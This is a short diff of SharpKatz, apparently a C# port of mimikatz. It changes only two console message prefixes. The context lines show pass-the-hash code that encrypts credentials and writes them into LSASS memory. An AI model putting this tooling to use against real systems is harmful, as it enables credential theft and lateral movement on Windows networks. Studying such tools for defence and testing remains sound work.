@@ -288,7 +288,7 @@ namespace SharpKatz.Module
                                 Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                 if (currentlogon == null)
                                 {
-                                    Console.WriteLine("[x] Something goes wrong");
+                                    Console.WriteLine("    Something goes wrong");
                                 }
                                 else
                                 {
@@ -373,7 +373,7 @@ namespace SharpKatz.Module
 
                                     byte[] msvEncryptedCredentialsBytes = BCrypt.EncryptCredentials(msvDecryptedCredentialsBytes, iv, aeskey, deskey);
 
-                                    Console.Write("[*]  \\_ msv1_0   - data copy @ {0:X} : ", primaryCredentials.Credentials.Buffer.ToInt64());
+                                    Console.Write("     \\_ msv1_0   - data copy @ {0:X} : ", primaryCredentials.Credentials.Buffer.ToInt64());
                                     pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, primaryCredentials.Credentials.Buffer, msvEncryptedCredentialsBytes);
 
                                     if (pthData.isReplaceOk)
